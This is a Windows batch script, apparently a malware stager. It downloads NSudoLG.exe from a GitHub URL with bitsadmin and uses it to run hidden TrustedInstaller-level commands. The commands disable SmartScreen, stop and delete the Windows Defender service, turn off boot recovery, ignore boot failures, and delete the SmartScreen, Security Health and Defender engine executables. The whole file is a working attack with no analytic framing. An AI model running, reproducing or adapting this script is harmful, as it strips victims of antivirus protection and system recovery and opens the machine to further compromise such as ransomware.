@echo off

cd C:\Users\

bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/whaomi23/HolaMundo./main/NSudoLG.exe C:\Users\NSudoLG.exe

cd C:\Users\

start NsudoLG.exe -U:T reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f

cd C:\Users\
start NSudoLG.exe -U:T -ShowWindowMode:Hide  sc stop  windefend  

cd  C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide  sc delete  windefend  

cd C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No

cd C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures

cd C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide cmd /c del C:\Windows\System32\smartscreen.exe 

cd C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide cmd /c del C:\Windows\System32\SecurityHealthService.exe

cd C:\Users\

start NSudoLG.exe -U:T -ShowWindowMode:Hide cmd /c del C:\Program Files\Windows Defender\MsMpEng.exe